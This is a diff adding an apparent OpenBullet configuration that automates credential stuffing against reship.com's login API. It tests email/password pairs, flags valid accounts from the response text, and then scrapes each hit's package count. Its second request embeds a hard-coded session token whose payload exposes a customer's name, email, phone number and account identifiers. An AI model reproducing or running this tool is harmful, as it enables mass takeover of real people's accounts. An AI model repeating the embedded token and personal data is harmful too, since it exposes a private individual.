@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "reship",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-21T18:38:09.9261166+01:00",
+  "AdditionalInfo": "",
+  "Author": "WEBKILLER",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.reship.com/rest/api/1/auth?timestamp=1558446468111" 
+  CONTENT "{\"emailAddress\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Host: www.reship.com" 
+  HEADER "Origin: https://www.reship.com" 
+  HEADER "Referer: https://www.reship.com/" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Your email address was not found" 
+    KEY "Invalid password" 
+  KEYCHAIN Success OR 
+    KEY "{\"token\":\"" 
+
+REQUEST GET "https://www.reship.com/components/packages/packages-at-warehouse.html" 
+  
+  HEADER "Accept: text/html" 
+  HEADER "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjb3VudHJ5IjoiR0IiLCJsYXN0TmFtZSI6IlNoaW5va3VibyIsInJlZ2lzdHJhdGlvblN0YXR1cyI6IlJFR0lTVFJBVElPTl9TVEFUVVNfRlVMTFlfUkVHSVNURVJFRCIsImRlZmF1bHRTaGlwcGluZ0FkZHJlc3MiOiI3OGVkMzU0OS1lMDM3LTRmMTUtYWUxYy05NmEyZmZkMzhmZTYiLCJmdWxsTmFtZSI6IkhlbGVuIFNoaW5va3VibyIsImFjdGl2ZSI6dHJ1ZSwiY3VzdG9tZXJOdW1iZXIiOjE2MzMwNywiZmlyc3ROYW1lIjoiSGVsZW4iLCJlbWFpbEFkZHJlc3MiOiJoZWxlbl9jYXJyb2xsanBAeWFob28uY28udWsiLCJwaG9uZU51bWJlciI6IjA3NTMzNDQxMjI2Iiwiam9pbkRhdGUiOiIyMDE1LTEyLTAxVDA5OjU4OjUzLjAzOVoiLCJmcmllbmRJZCI6IiIsInJlZmVycmFsQ29tcGxldGVEYXRlIjpudWxsLCJjdXN0b21lcklkIjoiOTBhY2FlYzYtOWM4ZS00YTQ5LWIyZDQtMGE5MWVjMjUyY2ZhIiwiY3VycmVudFRyYW5zYWN0aW9uSWQiOiI1NjIyNDUxNC1kZjBiLTQwMTQtYTFjYi1jZTkyMTljNmZkMTIiLCJleHAiOjE1NTg0ODg0ODIsImRlZmF1bHRCaWxsaW5nQWRkcmVzcyI6Ijc4ZWQzNTQ5LWUwMzctNGYxNS1hZTFjLTk2YTJmZmQzOGZlNiJ9.P15XUlUipZPgqto_6ay42fA9PRxRA_1ZwHAfwYq6KYI" 
+  HEADER "Referer: https://www.reship.com/" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" 
+
+PARSE "<SOURCE>" LR " <div ng-if=\"packages.length == " "\">" -> CAP "nombre package" 
+
